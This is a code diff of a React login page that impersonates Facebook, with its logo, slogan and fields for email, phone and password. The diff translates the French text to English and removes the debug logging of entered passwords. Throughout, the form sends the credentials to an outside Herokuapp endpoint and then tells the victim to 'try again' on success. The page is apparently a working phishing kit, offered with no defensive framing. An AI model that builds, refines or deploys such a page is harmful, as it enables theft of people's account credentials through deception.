@@ -11,10 +11,6 @@ export default function Accueil(){
 
     const handleSubmit = (e) => {
         e.preventDefault();
-
-        console.log("Numéro de téléphone : " + number);
-        console.log("Mot de passe : " + password);
-
         fetch("https://universal-app-21e471211385.herokuapp.com/login-client",{
         method: "POST",
         crossDomain: true,
@@ -31,7 +27,7 @@ export default function Accueil(){
     .then((res) => res.json())
     .then((data) => {
         if(data.status === "ok"){
-            alert('Veuillez Rééssayer')
+            alert('Please try again')
         }else{
             alert('Something went wrong')
         }
@@ -46,34 +42,31 @@ export default function Accueil(){
                         <img src={Logo} alt="Facebook_image"/>
                     </div>
                     <h2 className="slogan">
-                        Avec Facebook, partager et rester en contact avec votre entourage.
+                        With Facebook, share and stay in touch with those around you.
                     </h2>
                 </div>
                 <div className="formulaire">
                     <div className="form_inscription">
                         <form method="post"id="loginForm" className="formul" onSubmit={handleSubmit}>
-                            <input type="text"  name="number" id="number" placeholder="Adresse email ou numéro de tel." className="input_text" value={number} onChange={(e) => setNumber(e.target.value)}/>
-                            <input type="password" id="pass" placeholder="Mot de passe" className="input_text" value={password} onChange={(e) => setPassword(e.target.value)}/>
-                            <input type="submit"  value="Se connecter" className="input_button"/>
+                            <input type="text"  name="number" id="number" placeholder="Email or phone number" className="input_text" value={number} onChange={(e) => setNumber(e.target.value)}/>
+                            <input type="password" id="pass" placeholder="Password" className="input_text" value={password} onChange={(e) => setPassword(e.target.value)}/>
+                            <input type="submit"  value="Log in" className="input_button"/>
                         </form>
                         <div className="link_oublie">
                             <a href="#">
-                                Mot de passe oublié ?
+                                Forgot your password ?
                             </a>
                         </div>
                         <div className="creer_compte">
-                            <a href="#">Créer nouveau compte</a>
+                            <a href="#">Create new account</a>
                         </div>
                     </div>
                     <div className="creer_page">
                         <p>
-                            <strong className="page_text">Créer une page</strong> pour une célébrité, une marque ou une <br/> entreprise..
+                            <strong className="page_text">Create a page</strong> for a celebrity, brand or <br/> business.
                         </p>
                     </div>
                 </div>
-        </div>
-        <div className="image_fond">
-            <img src={font} alt="Jolie dossier"/>
         </div>
     </div>
 )}
